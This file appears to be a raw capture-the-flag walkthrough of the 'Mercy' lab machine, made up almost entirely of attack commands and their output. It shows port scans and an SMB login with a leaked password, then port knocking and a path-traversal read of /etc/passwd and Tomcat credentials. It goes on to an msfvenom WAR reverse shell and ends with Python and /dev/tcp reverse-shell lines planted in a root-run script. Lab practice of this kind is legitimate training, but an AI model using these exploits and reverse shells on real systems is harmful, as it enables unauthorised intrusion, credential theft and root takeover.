@@ -1,0 +1,271 @@
+└─$ nmap -p- 192.168.56.110
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 03:14 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.110
+Host is up (0.00016s latency).
+Not shown: 65525 closed tcp ports (reset)
+PORT     STATE    SERVICE
+22/tcp   filtered ssh
+53/tcp   open     domain
+80/tcp   filtered http
+110/tcp  open     pop3
+139/tcp  open     netbios-ssn
+143/tcp  open     imap
+445/tcp  open     microsoft-ds
+993/tcp  open     imaps
+995/tcp  open     pop3s
+8080/tcp open     http-proxy
+
+└─$ nmap -sSCV -p 22,53,80,110,139,143,445,993,995,8080 192.168.56.110
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 04:23 EDT
+Nmap scan report for 192.168.56.110
+Host is up (0.0013s latency).
+
+PORT     STATE    SERVICE     VERSION
+22/tcp   filtered ssh
+53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
+80/tcp   filtered http
+110/tcp  open     pop3        Dovecot pop3d
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-08-24T13:22:55
+|_Not valid after:  2028-08-23T13:22:55
+|_pop3-capabilities: PIPELINING UIDL SASL RESP-CODES CAPA STLS TOP AUTH-RESP-CODE
+|_ssl-date: TLS randomness does not represent time
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open     imap        Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-08-24T13:22:55
+|_Not valid after:  2028-08-23T13:22:55
+|_imap-capabilities: more OK STARTTLS have post-login LOGINDISABLEDA0001 listed capabilities IMAP4rev1 LOGIN-REFERRALS Pre-login IDLE ID ENABLE SASL-IR LITERAL+
+445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+993/tcp  open     ssl/imap    Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-08-24T13:22:55
+|_Not valid after:  2028-08-23T13:22:55
+|_imap-capabilities: OK more have post-login listed LITERAL+ capabilities IMAP4rev1 LOGIN-REFERRALS Pre-login IDLE ID ENABLE SASL-IR AUTH=PLAINA0001
+995/tcp  open     ssl/pop3    Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-08-24T13:22:55
+|_Not valid after:  2028-08-23T13:22:55
+|_pop3-capabilities: PIPELINING UIDL USER RESP-CODES CAPA SASL(PLAIN) TOP AUTH-RESP-CODE
+8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-server-header: Apache-Coyote/1.1
+| http-robots.txt: 1 disallowed entry 
+|_/tryharder/tryharder
+MAC Address: 08:00:27:17:60:AB (Oracle VirtualBox virtual NIC)
+Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2025-04-02T16:23:44
+|_  start_date: N/A
+|_clock-skew: mean: 5h19m52s, deviation: 4h37m07s, median: 7h59m52s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: mercy
+|   NetBIOS computer name: MERCY\x00
+|   Domain name: \x00
+|   FQDN: mercy
+|_  System time: 2025-04-03T00:23:44+08:00
+|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+http://192.168.56.110:8080/robots.txt
+User-agent: *
+Disallow: /tryharder/tryharder
+
+http://192.168.56.110:8080//tryharder/tryharder
+SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
+
+[~]$ echo "SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==" | base64 -d
+It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.
+
+Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.
+
+No fluffy bunnies for those who set insecure passwords and endanger the enterprise.% 
+
+└─$ smbclient \\\\192.168.56.110\\qiu -U fluffy              
+Password for [WORKGROUP\fluffy]:
+password
+
+Password for [WORKGROUP\qiu]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Aug 31 15:07:00 2018
+  ..                                  D        0  Mon Nov 19 11:59:09 2018
+  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
+  .public                            DH        0  Sun Aug 26 10:23:24 2018
+  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
+  .cache                             DH        0  Fri Aug 31 14:22:05 2018
+  .private                           DH        0  Sun Aug 26 12:35:34 2018
+  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
+  .profile       
+
+
+smb: \> more .bash_history //it seems the way to es 
+
+exit
+cd ../
+cd home
+cd qiu
+cd .secrets
+ls -al
+cd .private
+ls
+cd secrets
+ls
+ls -al
+cd ../
+ls -al
+cd opensesame
+ls -al
+./configprint
+sudo configprint
+sudo su -
+exit
+
+smb: \.private\> ls
+  .                                   D        0  Sun Aug 26 12:35:34 2018
+  ..                                  D        0  Fri Aug 31 15:07:00 2018
+  opensesame                          D        0  Thu Aug 30 12:36:50 2018
+  readme.txt                          N       94  Sun Aug 26 10:22:35 2018
+  secrets                             D        0  Mon Nov 19 12:01:09 2018
+
+
+Here are settings for your perusal.
+
+Port Knocking Daemon Configuration
+
+[options]
+        UseSyslog
+
+[openHTTP]
+        sequence    = 159,27391,4
+        seq_timeout = 100
+        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+        tcpflags    = syn
+
+[closeHTTP]
+        sequence    = 4,27391,159
+        seq_timeout = 100
+        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
+        tcpflags    = syn
+
+[openSSH]
+        sequence    = 17301,28504,9999
+        seq_timeout = 100
+        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+
+[closeSSH]
+        sequence    = 9999,28504,17301
+        seq_timeout = 100
+        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+        tcpflags    = syn
+
+Apache2 Configuration
+
+# This is the main Apache server configuration file.  It contains the
+# configuration directives that give the server its instructions.
+# See http://httpd.apache.org/docs/2.4/ for detailed information about
+# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+
+
+└─$ knock 192.168.56.110 159 27391 4
+
+└─$ nmap -sSCV -p 80 192.168.56.110
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 04:56 EDT
+Nmap scan report for 192.168.56.110
+Host is up (0.00046s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 2 disallowed entries 
+|_/mercy /nomercy
+
+http://192.168.56.110/
+This machine shall make you plead for mercy! Bwahahahahaha!
+
+http://192.168.56.110/mercy/index
+Welcome to Mercy!
+
+We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.
+
+http://192.168.56.110/nomercy/  //rps0.53
+
+http://192.168.56.110/nomercy/windows/code.php?file=../../../../../../etc/passwd
+	<? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
+	<? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
+	<? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
+	<? fluffy:x:1003:1003::/home/fluffy:/bin/sh
+
+
+http://192.168.56.110/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml
+
+	<? -->
+	<? <role rolename="admin-gui"/>
+	<? <role rolename="manager-gui"/>
+	<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
+	<? <user username="fluffy" password="freakishfluffybunny" roles="none"/>
+	<? </tomcat-users>
+
+
+
+
+[*] exec: msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.108 LPORT=555 -f war >./shell.war
+
+//upload the war file to manager page,
+└─$ nc -nvlp 555 
+listening on [any] 555 ...
+connect to [192.168.56.108] from (UNKNOWN) [192.168.56.110] 59492
+id
+uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
+python -c 'import pty; pty.spawn("/bin/bash")'
+tomcat7@MERCY:/var/lib/tomcat7$ pwd
+
+$ cat .secrets
+cat .secrets
+Try harder!
+$ cat timeclock
+cat timeclock
+#!/bin/bash
+
+cd secrets
+$ ls -la
+ls -la
+total 20
+drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
+drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
+-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
+-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
+-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
+
+
+now=$(date)
+echo "The system time is: $now." > ../../../../../var/www/html/time
+echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
+chown www-data:www-data ../../../../../var/www/html/time
+
+//timeclock with root privi, modify timeclock file.
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.108",8821));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+/bin/bash -i > /dev/tcp/192.168.56.108/8821 0<& 2>&1
